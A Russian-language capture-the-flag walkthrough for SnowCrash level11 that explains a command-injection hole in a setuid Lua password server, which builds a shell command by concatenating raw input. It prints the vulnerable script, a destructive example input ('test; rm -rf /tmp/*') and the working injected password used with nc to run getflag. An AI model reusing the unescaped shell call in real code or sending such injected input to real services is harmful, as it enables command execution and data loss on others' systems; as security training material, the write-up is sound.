1) Проверяем дерикторию
<<<
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
>>>
2) Выполним
<<<
level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
>>>
3) Откроем сам скрипт
<<<
level11@SnowCrash:~$ cat ./level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
>>>

Этот Lua‑скрипт поднимает TCP‑сервер на 127.0.0.1:5151 и ждёт подключения. При подключении он отправляет клиенту строку "Password: ". Получает введённый пароль. Считает его SHA1‑хэш (через вызов sha1sum). Сравнивает с жёстко заданным эталонным хэшем f05d1d066fb246efe0c6f7d095f909a7a0cf34a0. Если совпадает → отвечает "Gz you dumb*" (успех). Если нет → отвечает "Erf nope.." (ошибка). После этого закрывает соединение и ждёт следующего клиента.

Проблема

prog = io.popen("echo "..pass.." | sha1sum", "r")

Значение pass (пароль, введённый клиентом) конкатенируется напрямую в строку команды. Нет экранирования, нет фильтрации. Это значит, что если клиент введёт что‑то вроде:
test; rm -rf /tmp/*

то в io.popen реально уйдёт:
echo test; rm -rf /tmp/* | sha1sum

В результате выполнятся произвольные команды в системе.

Это классическая command injection (инъекция команд). Программа доверяет пользовательскому вводу и вставляет его в shell‑команду. Любой, кто подключится к порту 5151, может ввести «пароль» с подстановкой команд. Эти команды выполнятся с правами пользователя, под которым запущен скрипт. Можно получить доступ к файлам, запустить getflag, или выполнить любую системную команду.

Чтобы «прослушать» порт 5151, нужно открыть TCP‑соединение к этому порту на локальной машине (127.0.0.1).
nc 127.0.0.1 5151

4) Выполним данную команду в еще одном окне терминала виртуальной машины.
<<<
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: dummy; getflag > /tmp/flag
Erf nope..
>>>
5) Получим флаг
<<<
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
>>>